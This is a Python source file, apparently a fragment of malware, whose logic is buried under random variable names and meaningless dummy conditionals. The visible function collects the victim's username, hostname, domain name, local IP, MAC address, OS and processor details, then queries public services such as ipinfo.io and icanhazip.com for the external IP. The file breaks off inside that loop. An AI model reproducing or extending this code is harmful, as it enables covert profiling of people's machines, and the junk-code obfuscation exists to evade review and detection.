# -*- coding: utf-8 -*-
import ctypes
mIUxWWtdPFsrNqfUBJPGvQUokpXvwhEj = 'VgJUlNySUMJKDGhHFsTSDlrGuWGiETkU'
RFQANqoxlGRePwaGULdsUyBfhcyeTJbU = 'RSkAJVNIeeVhkCgTYtLcbRoBlpUphCra'
if mIUxWWtdPFsrNqfUBJPGvQUokpXvwhEj != RFQANqoxlGRePwaGULdsUyBfhcyeTJbU:
    SdFLrkcZpITyBFdKgQRsYoGkhIDXfIoc = 'RgXIqiMFYbAEPNOsIKSicBqJimPGElkR'
    oiiHppyfaBzzRKUdJiKPtQTzpZLwUrnf = 'bqAirhnkGgPLHiGZrnGQTNiKtCdnXcVx'
    oiiHppyfaBzzRKUdJiKPtQTzpZLwUrnf = SdFLrkcZpITyBFdKgQRsYoGkhIDXfIoc
import getpass
TfYJnMPSwjcsPVMDBGRtXrSeubIqWzvG = 'JyUmwadDhSXpMDHvaqqxDnXAnVjUKhLL'
yjKPEFBYoKuTjSpwrrVxNvkDxWDvrVtz = 'gNgbmwWLznuFiBrqIfoFOCpJzEwjycyu'
if TfYJnMPSwjcsPVMDBGRtXrSeubIqWzvG != yjKPEFBYoKuTjSpwrrVxNvkDxWDvrVtz:
    NRqDpzYypyqAhIYdczBBRkPGccEuyFwJ = 'yzrQDcbNWbAVnQxKmogcAWvUPqWKlXKw'
    LNIrVvmiunMVqENevZumkZaWewdqrgLP = 'sYxhsBttnfIItUzMyStTCukJYIxVKDut'
    LNIrVvmiunMVqENevZumkZaWewdqrgLP = NRqDpzYypyqAhIYdczBBRkPGccEuyFwJ
import os
XIvFycCubcKSVYMgqzNCwoXBxwNjxXJK = 'MoXNfpBrjiSuzqfSOELmeDFNaiDSfqbw'
NnukLfsjqIiSGKfvnaQXBoUHIPunJUTa = 'fCueASdWWWVGtiQWjxCxZgzTECTWGIMS'
DomcfzcdyzMBUwmwjsoitNQxqeHnlOAW = 'MZbXXvVitpmtFkhoRmGUupbfvtCFzCmS'
aCtCiZviVDmkkpxslNqCZbOsnKUupJCH = 'QhquVnbeLcBeaKJUwzikyQznTZfzIFeq'
VQbbUxDrsEVaeyMgjLqDOVLXJCFiXOjB = 'YPXaKCryLkPXUCfPIJfLiPgMNGggkIcX'
QDxPmOyOSXawEeryfmEjSIwqJzXtBBxL = 'TSCPbqVKgAtisVlOJRWwDsxcYPSFIlTy'
if DomcfzcdyzMBUwmwjsoitNQxqeHnlOAW == aCtCiZviVDmkkpxslNqCZbOsnKUupJCH:
    for QDxPmOyOSXawEeryfmEjSIwqJzXtBBxL in VQbbUxDrsEVaeyMgjLqDOVLXJCFiXOjB:
        if QDxPmOyOSXawEeryfmEjSIwqJzXtBBxL == aCtCiZviVDmkkpxslNqCZbOsnKUupJCH:
            VQbbUxDrsEVaeyMgjLqDOVLXJCFiXOjB = XIvFycCubcKSVYMgqzNCwoXBxwNjxXJK
        else:
            aCtCiZviVDmkkpxslNqCZbOsnKUupJCH = NnukLfsjqIiSGKfvnaQXBoUHIPunJUTa
import platform
tIETplszYfdlGBOKWkNPoBonEfRVVVPE = 'mxQMyguJGHYmrSiUDsNpHEyAwhAZJKih'
CKTPTqfskjoaVlkfHImtAKzVYBCcBJIk = 'UZEUtwnNDkZrnGezmnLvKPuyzMiGApoq'
KihlYikvIwEGzhMiRxdAaiuDdtlDdhBv = 'WXkashFwZubNfxPkeAoSQysBeTecbelI'
if tIETplszYfdlGBOKWkNPoBonEfRVVVPE == CKTPTqfskjoaVlkfHImtAKzVYBCcBJIk:
    HRvDjoqJMkgVmmGxqtlmiuSmCwBYRcck = 'oeGYBnPJmYhNgsrZKYSvwlzkKMjgsZym'
    HRvDjoqJMkgVmmGxqtlmiuSmCwBYRcck = tIETplszYfdlGBOKWkNPoBonEfRVVVPE
else:
    HRvDjoqJMkgVmmGxqtlmiuSmCwBYRcck = 'oeGYBnPJmYhNgsrZKYSvwlzkKMjgsZym'
    HRvDjoqJMkgVmmGxqtlmiuSmCwBYRcck = KihlYikvIwEGzhMiRxdAaiuDdtlDdhBv
import socket
cFoFdJLsDYNCpiHUhNUEbJlCQumXArCS = 'sXbUivGEcXOJDxRLnCsLlddbMobRgjWS'
haAYDytHeDEmEQkcqwluQAKNUktXaMpw = 'XdghunIOzfWgcpfEzraTkppQazPeiayF'
fPCrudnWGVTLAPqMWeEDaDxZNqQUOsvU = 'qxflgnvaFxIQnDOZDxLtOcRxeeqylNny'
GqYtyENQlXwtqMWfOrXOcfvaJDEqUlas = 'TZSsJqppMvojwucnGstMcymxyZpTpriR'
BWYsIIrXGMBPmbnOexjXVmmLlDTupRCz = 'bTduqxjJmqbTjMPlgfrgFYHVIOtvTflX'
OzZTNdKCgfzotkZhdLaXiAHNHaNaGlzf = 'sbjObUUIWrhHTzOlYStMihSehAHMtxyS'
if fPCrudnWGVTLAPqMWeEDaDxZNqQUOsvU == GqYtyENQlXwtqMWfOrXOcfvaJDEqUlas:
    for OzZTNdKCgfzotkZhdLaXiAHNHaNaGlzf in BWYsIIrXGMBPmbnOexjXVmmLlDTupRCz:
        if OzZTNdKCgfzotkZhdLaXiAHNHaNaGlzf == GqYtyENQlXwtqMWfOrXOcfvaJDEqUlas:
            BWYsIIrXGMBPmbnOexjXVmmLlDTupRCz = cFoFdJLsDYNCpiHUhNUEbJlCQumXArCS
        else:
            GqYtyENQlXwtqMWfOrXOcfvaJDEqUlas = haAYDytHeDEmEQkcqwluQAKNUktXaMpw
import urllib
vJoCyTBGZywsByvifEpzdBcOGcyiIluS = 'tzEcPrPNMLxhTjODpLBvtmLdMjhApyAK'
TnLcvoyyBHSTCYNUcrNiPcPsVKPeoHJU = 'ZdDIiRJMuoLiKmmpwbxRKyKUwFLAcFyQ'
lQiMglckgpWxcayXadVZQSPkzllQClaa = 'BVdSKJEHgnbMuTOboNvliCzDNiUvdOUo'
mNJhDcfKxDNxxpmcIsmufFZCgBqsvYWh = 'yhmIVckdUYwICYiNQRiCFhWWJHFiTTUP'
temdMdBVMXZvZUOSwvvzmVXHpjhFkebY = 'WyyfztdsDmNiCNGIHasozYVgCScBuzPp'
vONMOuerXIPsXGGvZbVAqxCEbczDblgy = 'MsBGrIGWYnWJmTxHxaHxPlhunBCrKUKh'
if vJoCyTBGZywsByvifEpzdBcOGcyiIluS != mNJhDcfKxDNxxpmcIsmufFZCgBqsvYWh:
    TnLcvoyyBHSTCYNUcrNiPcPsVKPeoHJU = lQiMglckgpWxcayXadVZQSPkzllQClaa
    for vONMOuerXIPsXGGvZbVAqxCEbczDblgy in mNJhDcfKxDNxxpmcIsmufFZCgBqsvYWh:
        if vONMOuerXIPsXGGvZbVAqxCEbczDblgy != lQiMglckgpWxcayXadVZQSPkzllQClaa:
            TnLcvoyyBHSTCYNUcrNiPcPsVKPeoHJU = TnLcvoyyBHSTCYNUcrNiPcPsVKPeoHJU
        else:
            temdMdBVMXZvZUOSwvvzmVXHpjhFkebY = vJoCyTBGZywsByvifEpzdBcOGcyiIluS
else:
    lQiMglckgpWxcayXadVZQSPkzllQClaa = vJoCyTBGZywsByvifEpzdBcOGcyiIluS
    vJoCyTBGZywsByvifEpzdBcOGcyiIluS = temdMdBVMXZvZUOSwvvzmVXHpjhFkebY
    if lQiMglckgpWxcayXadVZQSPkzllQClaa == vJoCyTBGZywsByvifEpzdBcOGcyiIluS:
        for vONMOuerXIPsXGGvZbVAqxCEbczDblgy in vJoCyTBGZywsByvifEpzdBcOGcyiIluS:
            if vONMOuerXIPsXGGvZbVAqxCEbczDblgy == lQiMglckgpWxcayXadVZQSPkzllQClaa:
                lQiMglckgpWxcayXadVZQSPkzllQClaa = vJoCyTBGZywsByvifEpzdBcOGcyiIluS
            else:
                lQiMglckgpWxcayXadVZQSPkzllQClaa = temdMdBVMXZvZUOSwvvzmVXHpjhFkebY
import uuid
JEKTQDIusvvMrvmINRHgmKWDRVaccrhC = 'NOXArwsJBjbWUGUcLCasuteHZvwRrvPf'
VhuwMmJmYexFQsNjITRYgvKqlHihZBUS = 'DnpOVybtXukIldqiPCkGFQQGiEjDtHTq'
lGhsdhsauboUyuljPTQKNlAVnLeBoIWM = 'rlqkqxvQOASbfQESRJwqwlEQnpQoElbK'
vCeFFiCPsnHcOMvkZmOUHlhvpwHEnaph = 'QAlaqFuehYkUqneeNqXkdiOSeMitsPpp'
ynQIMkDgkAFdEiRfoeIPiJrecqIxxKZk = 'uuCOkDVFWraSZTsUWzCQKHknyHPQEPqt'
KpRxnAKXBcGYglizPIsgjdqcpnJDNuyz = 'jRRVnKtpOvtVZPnMCVsIOyjyTYQlgzhL'
if lGhsdhsauboUyuljPTQKNlAVnLeBoIWM == vCeFFiCPsnHcOMvkZmOUHlhvpwHEnaph:
    for KpRxnAKXBcGYglizPIsgjdqcpnJDNuyz in ynQIMkDgkAFdEiRfoeIPiJrecqIxxKZk:
        if KpRxnAKXBcGYglizPIsgjdqcpnJDNuyz == vCeFFiCPsnHcOMvkZmOUHlhvpwHEnaph:
            ynQIMkDgkAFdEiRfoeIPiJrecqIxxKZk = JEKTQDIusvvMrvmINRHgmKWDRVaccrhC
        else:
            vCeFFiCPsnHcOMvkZmOUHlhvpwHEnaph = VhuwMmJmYexFQsNjITRYgvKqlHihZBUS
def GkCWbCyyixKfAFbWumWRqkyYVixwmlnc(plat_type):
    JXTtbKJzqcNlhCOJNLZqNlalKMKCobSb = 'HVekfArIBoDDLsabaIDyOhUUzOgQbaur'
    jaNWhMYJyjpcpNWwxPyBDJrieEYMOffT = 'ZGFcNypYGQqpjqYHTouYEZcChmaEXhVd'
    if JXTtbKJzqcNlhCOJNLZqNlalKMKCobSb != jaNWhMYJyjpcpNWwxPyBDJrieEYMOffT:
        TsfrerVfPDvGcwBvMQRQrNrVoZcKSOHj = 'ESNyFfonLrFPjqtMJKUmGSgMwkgLsWCa'
        FcoyfHsZIqQmSeTbSdRZQlsbQMCKjgvD = 'eSwmDNUkPAiZSCOTkHNqiZsrRVZaevaO'
        FcoyfHsZIqQmSeTbSdRZQlsbQMCKjgvD = TsfrerVfPDvGcwBvMQRQrNrVoZcKSOHj
    zmtvaFWZmUsxCNHdBfZMFHqckKxonbPD = platform.platform()
    DxoqBnIAYAoRiNRXkctbULupNmUQFezG = 'boSzmiaURafzIeQHIWZbzhISXbIAugCd'
    pTnhhVShNjgboYkOZNqaVFffjpYipSWP = 'AOhrgOklpyxpQGXeQepbqYoBcmCFLvnI'
    ULVEDoFDVOFiffGSkvlhaoqeWNATXezl = 'BlYYUKzmXKmlgsFIvwdHPOWMZSNZrRIj'
    RuhHjQvtJTYcshLQzRhGVSsEbVpdpKUe = 'SAXBGelyPUibtMyBTcqfjvjJaaIBXHfX'
    pmOiyDouzVnoiFOBOCJogYARySJDRYyX = 'ERolCoHEnbsVMWHGZsdZqnvUexptuwaT'
    if DxoqBnIAYAoRiNRXkctbULupNmUQFezG in pTnhhVShNjgboYkOZNqaVFffjpYipSWP:
        DxoqBnIAYAoRiNRXkctbULupNmUQFezG = pmOiyDouzVnoiFOBOCJogYARySJDRYyX
        if pTnhhVShNjgboYkOZNqaVFffjpYipSWP in ULVEDoFDVOFiffGSkvlhaoqeWNATXezl:
            pTnhhVShNjgboYkOZNqaVFffjpYipSWP = RuhHjQvtJTYcshLQzRhGVSsEbVpdpKUe
    elif pTnhhVShNjgboYkOZNqaVFffjpYipSWP in DxoqBnIAYAoRiNRXkctbULupNmUQFezG:
        ULVEDoFDVOFiffGSkvlhaoqeWNATXezl = pTnhhVShNjgboYkOZNqaVFffjpYipSWP
        if ULVEDoFDVOFiffGSkvlhaoqeWNATXezl in pTnhhVShNjgboYkOZNqaVFffjpYipSWP:
            pTnhhVShNjgboYkOZNqaVFffjpYipSWP = pmOiyDouzVnoiFOBOCJogYARySJDRYyX
    processor    = platform.processor()
    mtLNkDrwUOgDatbOCJFlkLpibNbnEysL = 'GUaAbiazlKDTmXAoFVTDCZpPcSbWBEtX'
    JtnYjVpsxlldsBLbsuphRARMUTlXIiid = 'DVoqccdwdBCrMjYzOQiqNyWUglZYgRtw'
    if mtLNkDrwUOgDatbOCJFlkLpibNbnEysL != JtnYjVpsxlldsBLbsuphRARMUTlXIiid:
        TKdjeTWsQAopUIvNIyGBJQvVwArjdLGW = 'YHDKWfVUfdKSUoOsceMZqYfnDROiIdaI'
        OOEixNWclhXXPhjntzUHnwQtfklbvwFz = 'UBBSvcFmwVRtITUFVsXlJUPlzDqGbDcJ'
        OOEixNWclhXXPhjntzUHnwQtfklbvwFz = TKdjeTWsQAopUIvNIyGBJQvVwArjdLGW
    architecture = platform.architecture()[0]
    JifiOaNEcYtTUWEFuNaEEtdbTAoxTqkX = 'jIXVEoImPFWKIAEopxEWdRKYnyfWFEnt'
    YJTEGEkstFseMNPuGOIBMfGlKGkhLrLL = 'WsRvNORupNOFNWceHuVfsDxgiXYZDtfH'
    rsnoecSoXYSrwUFgBRYYfzTUEaGceWMt = 'PoLswJGzbyCXCyufvWenzIaVobuDpcxJ'
    if JifiOaNEcYtTUWEFuNaEEtdbTAoxTqkX == YJTEGEkstFseMNPuGOIBMfGlKGkhLrLL:
        cUvlwlNgtkqyYFPZCHZDQlFeSiszcAUl = 'pKkQTJMgLwOZhPxcZANJwbMFFEiVsOJx'
        cUvlwlNgtkqyYFPZCHZDQlFeSiszcAUl = JifiOaNEcYtTUWEFuNaEEtdbTAoxTqkX
    else:
        cUvlwlNgtkqyYFPZCHZDQlFeSiszcAUl = 'pKkQTJMgLwOZhPxcZANJwbMFFEiVsOJx'
        cUvlwlNgtkqyYFPZCHZDQlFeSiszcAUl = rsnoecSoXYSrwUFgBRYYfzTUEaGceWMt
    XQPNCkjgXZcjuKGtjdkBuWvtDIJsjpIR = getpass.getuser()
    JjlaaQaVKeeJDfbcSYNHPSASlSPHVtdO = 'OjauASvzBATxpWABkpnfAmDdpVjxshZt'
    uhKZfyIOHHlZGzqhyiPgSMeSEYSyyFDA = 'mEQuoZwyxirTofzKUvvcaXkwgBlnpCgB'
    lAgsKYoXNqdiCuHPUhjuohFkFYYBnRxr = 'SasVBlemOKQbYtzdosUCeJzpuOcloFMS'
    zdkeHyQobOWSydtmcNfuFWOkCfvJqfjj = 'yZukGwrGjSpRefIvwsLFxgQfDDZidsSF'
    ePtItTcTgexixucwsdNrlzbQsKLhsRzj = 'sEqNUYSCwbesoGSYuUGdCfiaiKMWpbNd'
    if JjlaaQaVKeeJDfbcSYNHPSASlSPHVtdO in uhKZfyIOHHlZGzqhyiPgSMeSEYSyyFDA:
        JjlaaQaVKeeJDfbcSYNHPSASlSPHVtdO = ePtItTcTgexixucwsdNrlzbQsKLhsRzj
        if uhKZfyIOHHlZGzqhyiPgSMeSEYSyyFDA in lAgsKYoXNqdiCuHPUhjuohFkFYYBnRxr:
            uhKZfyIOHHlZGzqhyiPgSMeSEYSyyFDA = zdkeHyQobOWSydtmcNfuFWOkCfvJqfjj
    elif uhKZfyIOHHlZGzqhyiPgSMeSEYSyyFDA in JjlaaQaVKeeJDfbcSYNHPSASlSPHVtdO:
        lAgsKYoXNqdiCuHPUhjuohFkFYYBnRxr = uhKZfyIOHHlZGzqhyiPgSMeSEYSyyFDA
        if lAgsKYoXNqdiCuHPUhjuohFkFYYBnRxr in uhKZfyIOHHlZGzqhyiPgSMeSEYSyyFDA:
            uhKZfyIOHHlZGzqhyiPgSMeSEYSyyFDA = ePtItTcTgexixucwsdNrlzbQsKLhsRzj
    QuZDtCNimWmsSeBSMoNpLJSiwvFNuQxD    = socket.gethostname()
    iXkNOdWXhZFlbPidKFYDVNJrEBWdMIEv = 'nouFrYzurdFWWnJzADNXsCtTcdtBdFZY'
    HrFuTeMuQiXCyYsGMCEQjLoXpvlqTRDl = 'ggTbWelpMBJdAglqzriNcOdDafgIMEDx'
    LsGTAtyXqkhnWNtNaKoTFyyXpzioMZJq = 'zRUlEwpPNwCMjsnVIceZDMBzHjgMYUcr'
    KkEDxSgcEPEUAISmvYSHxHJIcROsCCht = 'tAwOfPlXOaEzAJVJOiDrIRQvswjmunaq'
    BycmWqVKYYDNvNUwypZSDtKrnDeecXZi = 'pCCOMJvwwAyPDVKJzvlHbRvYKayLVvkM'
    if iXkNOdWXhZFlbPidKFYDVNJrEBWdMIEv in HrFuTeMuQiXCyYsGMCEQjLoXpvlqTRDl:
        iXkNOdWXhZFlbPidKFYDVNJrEBWdMIEv = BycmWqVKYYDNvNUwypZSDtKrnDeecXZi
        if HrFuTeMuQiXCyYsGMCEQjLoXpvlqTRDl in LsGTAtyXqkhnWNtNaKoTFyyXpzioMZJq:
            HrFuTeMuQiXCyYsGMCEQjLoXpvlqTRDl = KkEDxSgcEPEUAISmvYSHxHJIcROsCCht
    elif HrFuTeMuQiXCyYsGMCEQjLoXpvlqTRDl in iXkNOdWXhZFlbPidKFYDVNJrEBWdMIEv:
        LsGTAtyXqkhnWNtNaKoTFyyXpzioMZJq = HrFuTeMuQiXCyYsGMCEQjLoXpvlqTRDl
        if LsGTAtyXqkhnWNtNaKoTFyyXpzioMZJq in HrFuTeMuQiXCyYsGMCEQjLoXpvlqTRDl:
            HrFuTeMuQiXCyYsGMCEQjLoXpvlqTRDl = BycmWqVKYYDNvNUwypZSDtKrnDeecXZi
    wkNKlScBkUmtKcZCEySitixcuvGkrPks        = socket.getfqdn()
    foKYOHiimtTzllYBqqGvbBtSVuVLUgIS = 'mEbNEQkNwInLiufnzAowmJtjdvKuajyR'
    YpTUSymYVubUoYlXXXIiJdqhSNRfGBCe = 'vKaprqrgVFEYmKUlKVhJDIMPgPKbEkJo'
    JwXHLaUvzorzMxqPMeseRiFvENwdNAWv = 'WSZevikGJpethXViKOSJvBXGviMtuOnu'
    qDSZjbHqZsMEoTMHoJUQyNpIdHlBWnYU = 'tAlpdsgAutKCdQvpkCEOZVGGTxgosqwy'
    FdwJzdHfBRysXFnhHfHUTauwahpcvWtg = 'NXcWqMFYDuHTYxkJTpLNmTcjeykFSTZW'
    if foKYOHiimtTzllYBqqGvbBtSVuVLUgIS in YpTUSymYVubUoYlXXXIiJdqhSNRfGBCe:
        foKYOHiimtTzllYBqqGvbBtSVuVLUgIS = FdwJzdHfBRysXFnhHfHUTauwahpcvWtg
        if YpTUSymYVubUoYlXXXIiJdqhSNRfGBCe in JwXHLaUvzorzMxqPMeseRiFvENwdNAWv:
            YpTUSymYVubUoYlXXXIiJdqhSNRfGBCe = qDSZjbHqZsMEoTMHoJUQyNpIdHlBWnYU
    elif YpTUSymYVubUoYlXXXIiJdqhSNRfGBCe in foKYOHiimtTzllYBqqGvbBtSVuVLUgIS:
        JwXHLaUvzorzMxqPMeseRiFvENwdNAWv = YpTUSymYVubUoYlXXXIiJdqhSNRfGBCe
        if JwXHLaUvzorzMxqPMeseRiFvENwdNAWv in YpTUSymYVubUoYlXXXIiJdqhSNRfGBCe:
            YpTUSymYVubUoYlXXXIiJdqhSNRfGBCe = FdwJzdHfBRysXFnhHfHUTauwahpcvWtg
    elmVCkDOPfuXryWuPsphOExTHiEjlrvv = socket.gethostbyname(QuZDtCNimWmsSeBSMoNpLJSiwvFNuQxD)
    XammdLbRDfeFpXXOBvGBMsISaZYKDeTk = 'sYRWlWkIDdOvSlAwGNbujGlkzIUetJFp'
    BAEfkCoYhQjdfqPpTRflirYYdmREbAze = 'nOGZtHOhuozqBHalJYCQQOMVfsQRhpkp'
    kloprFvJrhZEzqESeVaiAkIMviKqFRma = 'ORGIuzDdEkEUPioVocBsOhPUUZuUeULe'
    uKEwYoDSfrTTLWGbgfxCOfzJwVpaXGjF = 'njvekoqAiODRxZVLQkzFTbzHIISgYJMN'
    gyhNcxDNXJNfZWLNANLFokOxMgLlgbJI = 'QGpSrqaAqfSVvEgwzlAATbOSkkotcLwB'
    zQOBnYIgQNivdJYjpBeOIHqoastpBMlM = 'ttEFMeRQhaCyOmAyqTXIuLTlfHhuVaaC'
    if XammdLbRDfeFpXXOBvGBMsISaZYKDeTk != uKEwYoDSfrTTLWGbgfxCOfzJwVpaXGjF:
        BAEfkCoYhQjdfqPpTRflirYYdmREbAze = kloprFvJrhZEzqESeVaiAkIMviKqFRma
        for zQOBnYIgQNivdJYjpBeOIHqoastpBMlM in uKEwYoDSfrTTLWGbgfxCOfzJwVpaXGjF:
            if zQOBnYIgQNivdJYjpBeOIHqoastpBMlM != kloprFvJrhZEzqESeVaiAkIMviKqFRma:
                BAEfkCoYhQjdfqPpTRflirYYdmREbAze = BAEfkCoYhQjdfqPpTRflirYYdmREbAze
            else:
                gyhNcxDNXJNfZWLNANLFokOxMgLlgbJI = XammdLbRDfeFpXXOBvGBMsISaZYKDeTk
    else:
        kloprFvJrhZEzqESeVaiAkIMviKqFRma = XammdLbRDfeFpXXOBvGBMsISaZYKDeTk
        XammdLbRDfeFpXXOBvGBMsISaZYKDeTk = gyhNcxDNXJNfZWLNANLFokOxMgLlgbJI
        if kloprFvJrhZEzqESeVaiAkIMviKqFRma == XammdLbRDfeFpXXOBvGBMsISaZYKDeTk:
            for zQOBnYIgQNivdJYjpBeOIHqoastpBMlM in XammdLbRDfeFpXXOBvGBMsISaZYKDeTk:
                if zQOBnYIgQNivdJYjpBeOIHqoastpBMlM == kloprFvJrhZEzqESeVaiAkIMviKqFRma:
                    kloprFvJrhZEzqESeVaiAkIMviKqFRma = XammdLbRDfeFpXXOBvGBMsISaZYKDeTk
                else:
                    kloprFvJrhZEzqESeVaiAkIMviKqFRma = gyhNcxDNXJNfZWLNANLFokOxMgLlgbJI
    xVwWzIGVOyyANXSDTMBdeFoAdkemDrIQ     = uuid.getnode()
    nbYqUgSfhhRgrqktGkvPJdysZyVyPZYc = 'iKocEKQyGnAHJKkzedvNBESqhdfhDzHA'
    fMUTnfhSLDrGpntTQAulzvRfBQDRQuHd = 'YDLUeOeybTUiSRGxHEJgGPhfhoaPOQck'
    if nbYqUgSfhhRgrqktGkvPJdysZyVyPZYc != fMUTnfhSLDrGpntTQAulzvRfBQDRQuHd:
        aDrjyQaHQyGWCzrcwnvYnfslCDUBHXbs = 'TcKKFPdqEMWSHAEpomxUJXWYdLwGAkHN'
        UYPnYhQGHysZnYkjwMdXblcEiROUkAhk = 'jCpjwXOeGCLhoYGPmTLkbDnPBfCsnZiE'
        UYPnYhQGHysZnYkjwMdXblcEiROUkAhk = aDrjyQaHQyGWCzrcwnvYnfslCDUBHXbs
    QncyPilQuaFYEuyuxeMtkHSKouUZPhTe         = ':'.join(("%012X" % xVwWzIGVOyyANXSDTMBdeFoAdkemDrIQ)[TSDrrqyYNWidFcjDhHTyswywnlivHMNy:TSDrrqyYNWidFcjDhHTyswywnlivHMNy+2] for TSDrrqyYNWidFcjDhHTyswywnlivHMNy in range(0, 12, 2))
    VSAKHyRxiyQDtAmDOBOhEeTKcqkJLhUt = 'ZSDjaHkBHdmcPKRTBjLgBudXYKDLVhqF'
    PoNDKSPuxyjUoBucSVtTMxGFdbJTpGqj = 'mdOZdOiSMHkQbPXaruivzWTzXapNoIGH'
    uBiiLkcrCWwlAzAKghxCtuqbeJtChcLO = 'EQlekVELkFHnoNBOlGXzpkJWrzUyFoGT'
    WOwYlFPKZIuVeJHsUSxsQgHhpOOKSEJY = 'CjhsETEfOVvYJbKvMNDZpyvMgAHYKXIm'
    DuogUgsEPplPietjsOWhiKFghozndIct = 'ppgEtWlyhWRztURHQXKsXojKxjRTehzB'
    IUSVnvCuZjopmKyWzDRHRWhXPwSOezEv = 'HshncAHdkwZCRDUJuEcCnRKdIgyGEhNA'
    if VSAKHyRxiyQDtAmDOBOhEeTKcqkJLhUt != WOwYlFPKZIuVeJHsUSxsQgHhpOOKSEJY:
        PoNDKSPuxyjUoBucSVtTMxGFdbJTpGqj = uBiiLkcrCWwlAzAKghxCtuqbeJtChcLO
        for IUSVnvCuZjopmKyWzDRHRWhXPwSOezEv in WOwYlFPKZIuVeJHsUSxsQgHhpOOKSEJY:
            if IUSVnvCuZjopmKyWzDRHRWhXPwSOezEv != uBiiLkcrCWwlAzAKghxCtuqbeJtChcLO:
                PoNDKSPuxyjUoBucSVtTMxGFdbJTpGqj = PoNDKSPuxyjUoBucSVtTMxGFdbJTpGqj
            else:
                DuogUgsEPplPietjsOWhiKFghozndIct = VSAKHyRxiyQDtAmDOBOhEeTKcqkJLhUt
    else:
        uBiiLkcrCWwlAzAKghxCtuqbeJtChcLO = VSAKHyRxiyQDtAmDOBOhEeTKcqkJLhUt
        VSAKHyRxiyQDtAmDOBOhEeTKcqkJLhUt = DuogUgsEPplPietjsOWhiKFghozndIct
        if uBiiLkcrCWwlAzAKghxCtuqbeJtChcLO == VSAKHyRxiyQDtAmDOBOhEeTKcqkJLhUt:
            for IUSVnvCuZjopmKyWzDRHRWhXPwSOezEv in VSAKHyRxiyQDtAmDOBOhEeTKcqkJLhUt:
                if IUSVnvCuZjopmKyWzDRHRWhXPwSOezEv == uBiiLkcrCWwlAzAKghxCtuqbeJtChcLO:
                    uBiiLkcrCWwlAzAKghxCtuqbeJtChcLO = VSAKHyRxiyQDtAmDOBOhEeTKcqkJLhUt
                else:
                    uBiiLkcrCWwlAzAKghxCtuqbeJtChcLO = DuogUgsEPplPietjsOWhiKFghozndIct
    KqILaYoHwOmRpmnYZSsvZjczWhanlSZD = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    wPmUDVgqtQZfEgSgpAGJEYQqTRkXaWwM = ''
    KqBArKVBvfvaUvWmgnqrIxPJZComveyB = 'xNybnarIhfjvnJYfnBHMOkivMcmmKPbi'
    dlvLVqvuxToMLHkzagBJWPZpiNakEOAt = 'dxTFAkAJZhIzTmTNxvkhIhiphLMVmXWy'
    NPYuJlDMPFXkjkueMHyzGkFQLMyWTEzP = 'KDqgSJTKEgigYcJgRgBAcrlnZERGNGmR'
    ZImNqBphbLykgzBZWNJdHJyodNYyApNV = 'HhdwIxPsgJnmvEkhRFplMNlkcDTDkrKf'
    wjwwyZMeXyMSsSbxgWpAPiUhtrhGgLIG = 'wAtBpAdMBBfhjNiMGQcvsaolFkvFrMWZ'
    if KqBArKVBvfvaUvWmgnqrIxPJZComveyB in dlvLVqvuxToMLHkzagBJWPZpiNakEOAt:
        KqBArKVBvfvaUvWmgnqrIxPJZComveyB = wjwwyZMeXyMSsSbxgWpAPiUhtrhGgLIG
        if dlvLVqvuxToMLHkzagBJWPZpiNakEOAt in NPYuJlDMPFXkjkueMHyzGkFQLMyWTEzP:
            dlvLVqvuxToMLHkzagBJWPZpiNakEOAt = ZImNqBphbLykgzBZWNJdHJyodNYyApNV
    elif dlvLVqvuxToMLHkzagBJWPZpiNakEOAt in KqBArKVBvfvaUvWmgnqrIxPJZComveyB:
        NPYuJlDMPFXkjkueMHyzGkFQLMyWTEzP = dlvLVqvuxToMLHkzagBJWPZpiNakEOAt
        if NPYuJlDMPFXkjkueMHyzGkFQLMyWTEzP in dlvLVqvuxToMLHkzagBJWPZpiNakEOAt:
            dlvLVqvuxToMLHkzagBJWPZpiNakEOAt = wjwwyZMeXyMSsSbxgWpAPiUhtrhGgLIG
    for CKNGafJMKJOozHoMvgWqfxcXvDZcoVGY in KqILaYoHwOmRpmnYZSsvZjczWhanlSZD:
        cBlrbIJKuxtlShwSgWeqzhAoKmozcZyo = 'beTtXMzcHVlEDruMfqfqXetMVCtaxgXl'
        ViphtzJVLoRHuXZdFpuKekIrByoWFkOb = 'NUhpAMZdHExaTVUKoGWBLDIGqSRlgGeZ'
        yJCRBOVDnbeyLQgTPvhHRvMPkyuZpEVh = 'ROEoABjhDfIaJGTtCgsgwfEPxowMksip'
        kBIrEPUTDsUrgCyERKhunmvALwjlWKot = 'mRimlYarSOhzfNsxwwfXmVkrEhaiAmXb'
        BlFSONwzbRWuMGsHrsOaBHHNXgUmsrZA = 'HlExHftltejSrJoCWyJtdGWfZqzNbDLl'
        if cBlrbIJKuxtlShwSgWeqzhAoKmozcZyo in ViphtzJVLoRHuXZdFpuKekIrByoWFkOb:
            cBlrbIJKuxtlShwSgWeqzhAoKmozcZyo = BlFSONwzbRWuMGsHrsOaBHHNXgUmsrZA
            if ViphtzJVLoRHuXZdFpuKekIrByoWFkOb in yJCRBOVDnbeyLQgTPvhHRvMPkyuZpEVh:
                ViphtzJVLoRHuXZdFpuKekIrByoWFkOb = kBIrEPUTDsUrgCyERKhunmvALwjlWKot
        elif ViphtzJVLoRHuXZdFpuKekIrByoWFkOb in cBlrbIJKuxtlShwSgWeqzhAoKmozcZyo:
            yJCRBOVDnbeyLQgTPvhHRvMPkyuZpEVh = ViphtzJVLoRHuXZdFpuKekIrByoWFkOb
            if yJCRBOVDnbeyLQgTPvhHRvMPkyuZpEVh in ViphtzJVLoRHuXZdFpuKekIrByoWFkOb:
                ViphtzJVLoRHuXZdFpuKekIrByoWFkOb = BlFSONwzbRWuMGsHrsOaBHHNXgUmsrZA
        try:
            tmDyqVBxjpHtBmhlkfgzARUVAuhFYrRJ = 'OTBuKBUufUfQYlcXYgSZwWMceIYkUOcQ'
            ElyigsgWqkfioHpLakTspTnzONUffAfY = 'zCqHdAdAzSkIIGanLHMNhKPhsOrXAUcu'
            yafQNClJKHetJGOXPtQAhroeZdLwWwkQ = 'FWzKZShDMXBnhQshrWhtVPDwIYcylkYH'
            QpwLvBkvKfgQgpYGOZCNlXgLXdiPZgqj = 'bLvdXzHWVuqquXzMaltYCfgvEYrfrfLy'
            bONRpobGaxSVANFhnejvgnDKsILENtxS = 'sbuVDvgoHVJxfNulvnhQFpzBCgvhRYng'
            RqNBeKORWIoyKskRYfDwQLLwYsnDErYh = 'PvkbfcSLjxWMvHxeHonfmYZIlZnUQPOs'
